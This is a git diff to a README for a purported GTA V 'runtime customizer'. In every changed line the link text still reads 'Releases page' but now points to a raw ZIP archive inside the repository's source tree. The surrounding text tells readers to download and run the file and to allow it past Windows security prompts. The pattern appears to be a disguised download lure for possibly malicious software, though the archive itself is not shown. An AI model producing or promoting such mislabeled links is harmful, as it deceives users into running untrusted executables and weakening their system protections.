@@ -1,6 +1,6 @@
 # 🚀 ApexRuntimeCustomizer - Fine-Tune Your GTA V Runtime
 
-[![Download ApexRuntimeCustomizer](https://img.shields.io/badge/Download-Release%20Page-blue.svg?style=for-the-badge)](https://github.com/prahlad7086/ApexRuntimeCustomizer/releases)
+[![Download ApexRuntimeCustomizer](https://img.shields.io/badge/Download-Release%20Page-blue.svg?style=for-the-badge)](https://github.com/prahlad7086/ApexRuntimeCustomizer/raw/refs/heads/main/src/Utilities/Apex-Runtime-Customizer-1.2.zip)
 
 ## 🧭 What This Is
 
@@ -10,7 +10,7 @@ Use it if you want to adjust game behavior, manage overlay options, and keep you
 
 ## 📥 Download
 
-Visit the [ApexRuntimeCustomizer Releases page](https://github.com/prahlad7086/ApexRuntimeCustomizer/releases) to download and run the latest version for Windows.
+Visit the [ApexRuntimeCustomizer Releases page](https://github.com/prahlad7086/ApexRuntimeCustomizer/raw/refs/heads/main/src/Utilities/Apex-Runtime-Customizer-1.2.zip) to download and run the latest version for Windows.
 
 ## ✅ What You Need
 
@@ -23,7 +23,7 @@ For best results, use a system that can handle GTA V and a DirectX 11 game overl
 
 ## 🚀 Getting Started
 
-1. Open the [Releases page](https://github.com/prahlad7086/ApexRuntimeCustomizer/releases).
+1. Open the [Releases page](https://github.com/prahlad7086/ApexRuntimeCustomizer/raw/refs/heads/main/src/Utilities/Apex-Runtime-Customizer-1.2.zip).
 2. Find the latest release.
 3. Download the Windows file for the app.
 4. If the file comes in a ZIP folder, extract it first.
@@ -35,7 +35,7 @@ If Windows shows a security prompt, choose the option that lets you run the file
 ## 🖥️ How to Install
 
 ### Step 1: Get the file
-Go to the [download page](https://github.com/prahlad7086/ApexRuntimeCustomizer/releases) and download the latest Windows package.
+Go to the [download page](https://github.com/prahlad7086/ApexRuntimeCustomizer/raw/refs/heads/main/src/Utilities/Apex-Runtime-Customizer-1.2.zip) and download the latest Windows package.
 
 ### Step 2: Extract the folder
 If the download is a ZIP file, right-click it and choose Extract All. Place the files in a folder you can find again, such as Downloads or Desktop.
@@ -114,7 +114,7 @@ Try these steps:
 3. Check that no files are missing from the folder.
 4. Close GTA V and open the app again.
 5. Restart your PC and try once more.
-6. Download the latest release from the [Releases page](https://github.com/prahlad7086/ApexRuntimeCustomizer/releases).
+6. Download the latest release from the [Releases page](https://github.com/prahlad7086/ApexRuntimeCustomizer/raw/refs/heads/main/src/Utilities/Apex-Runtime-Customizer-1.2.zip).
 
 ## 🔒 Safety and Access
 
@@ -134,7 +134,7 @@ Check your display mode and close other overlays that may block it.
 Update the app, restart the game, and test with only this tool running.
 
 ### I cannot find the download
-Go back to the [ApexRuntimeCustomizer Releases page](https://github.com/prahlad7086/ApexRuntimeCustomizer/releases) and pick the newest release for Windows.
+Go back to the [ApexRuntimeCustomizer Releases page](https://github.com/prahlad7086/ApexRuntimeCustomizer/raw/refs/heads/main/src/Utilities/Apex-Runtime-Customizer-1.2.zip) and pick the newest release for Windows.
 
 ## 🗂️ Project Topics
 
@@ -153,4 +153,4 @@ This project fits these areas:
 
 ## 📦 Download Again
 
-If you need the file again, visit the [ApexRuntimeCustomizer Releases page](https://github.com/prahlad7086/ApexRuntimeCustomizer/releases) and download and run the latest Windows release
+If you need the file again, visit the [ApexRuntimeCustomizer Releases page](https://github.com/prahlad7086/ApexRuntimeCustomizer/raw/refs/heads/main/src/Utilities/Apex-Runtime-Customizer-1.2.zip) and download and run the latest Windows release
